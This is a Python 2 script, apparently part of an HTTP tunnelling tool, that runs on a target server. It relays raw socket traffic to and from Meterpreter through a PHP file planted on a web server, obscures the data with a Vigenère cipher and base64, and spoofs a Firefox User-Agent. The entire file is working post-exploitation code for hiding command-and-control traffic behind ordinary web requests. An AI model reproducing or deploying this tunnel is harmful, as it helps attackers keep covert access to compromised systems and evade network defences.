import urllib2,urllib,base64,socket,time

try: 
   import hashlib
except ImportError:
   import md5 as hashlib

#THIS SCRIPT SHOULD RUN AT SERVER(TARGET) here the script waits for a program to attatch t itself
#target where php resides
target = "http://127.0.0.1/<location to tunnel>/firedrill.php"
channelmine = "chnl0" #channelwhich this console recieves read
channelother = "chnl1"  #channelwhich this console writes to.
cookies =  'A111A135818' #default session id (LEAVE IT AS DEFAULT)
host = ''        # Symbolic name meaning all available interfaces (LEAVE IT AS DEFAULT)
port = 12345     # Port to listen to for the bridge
buffrlngth = 1024 * 100 #the default buffer lenght to read
speed = 0.25 #Request speed- lower faster
key = "12345" #password used to encrypt the data before senting

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((host, port))
s.listen(1)

conn, addr = s.accept()
sent_toweb = []
conn.settimeout(speed)

#encode with key (USES VIGNERE CIPHER)
def encode(key, clear):
    enc = []
    for i in range(len(clear)):
        key_c = key[i % len(key)]
        enc_c = chr((ord(clear[i]) + ord(key_c)) % 256)
        enc.append(enc_c)
    return base64.urlsafe_b64encode("".join(enc))

#decode with key (USES VIGNERE CIPHER)
def decode(key, enc):
    dec = []
    enc = base64.urlsafe_b64decode(enc)
    for i in range(len(enc)):
        key_c = key[i % len(key)]
        dec_c = chr((256 + ord(enc[i]) - ord(key_c)) % 256)
        dec.append(dec_c)
    return "".join(dec)

#post value on channel
def postonchannel(channel,value):
	chnldata = {channel : value}
	req = urllib2.Request(target + "/?action=post", urllib.urlencode(chnldata),{'PHPSESSID': cookies,'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0'})
	response = urllib2.urlopen(req)

#read from channel
def readchannel(channel):
	opener = urllib2.build_opener()
	opener.addheaders = [('PHPSESSID',cookies),('User-Agent','Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0')]
	f = opener.open(target + "/?action=recv&channel=" +channel)
	return f.read()

#check wether data exists in channel
def checkchannel(channel):
	opener = urllib2.build_opener()
	opener.addheaders = [('PHPSESSID',cookies),('User-Agent','Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0')]
	f = opener.open(target + "/?action=check&channel=" +channel)
	return f.read()

#terminates alll session tokens
def terminatesessions():
	opener = urllib2.build_opener()
	opener.addheaders = [('PHPSESSID',cookies),('User-Agent','Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0')]
	f = opener.open(target + "/?action=terminate")


#main_function
def socket_to_net():
	while True:
		time.sleep(speed)
		try:
			data = conn.recv(buffrlngth)

		except socket.timeout, e:
			err = e.args[0]
			if err == 'timed out':
				#check if my channel has any data
				if (int(checkchannel(channelmine))) :
					#has data so read data and sent to meterpreter
					chnlread = readchannel(channelmine)
					chnlpassd = decode(key,chnlread)
					conn.send(chnlpassd)
					print "Recieved from web: " 
					print len(chnlread)
					print "Reception digestcmpr: "
					print hashlib.md5(chnlread).hexdigest()
					print "Reception digestdecd: "
					print hashlib.md5(chnlpassd).hexdigest()


				#check if other channel have any data
				if not int(checkchannel(channelother)) and len(sent_toweb) :
					bts = sent_toweb.pop(0)
					code = encode(key,bts)
					#no data on other channel so writing to other channel
					print "Posting on raw data: " 
					print len(encode(key,bts))
					print "Posting digest: "
					print hashlib.md5(bts).hexdigest()
					print "Posting digestencd: "
					print hashlib.md5(code).hexdigest()
					postonchannel(channelother, code)
				
				#print whatever left on the stack
				#print sent_toweb
				continue

			else:

				print e
				break

		except socket.error,e:
			print "error"
			break
    	
		else:
			if len(data) == 0:
				print 'Server terminated'
				break
			else:
				#recieved data from meterpreter now injecting that data into stack
				sent_toweb.append(data)
				#print data
	
	conn.close()


if __name__ == "__main__": 
	try:
		socket_to_net()
		print "Terminaing sessions"
		terminatesessions()
	except KeyboardInterrupt:
		print "Interrupt called"
		terminatesessions()
		conn.close()

#postonchannel("hi")
#print readchannel()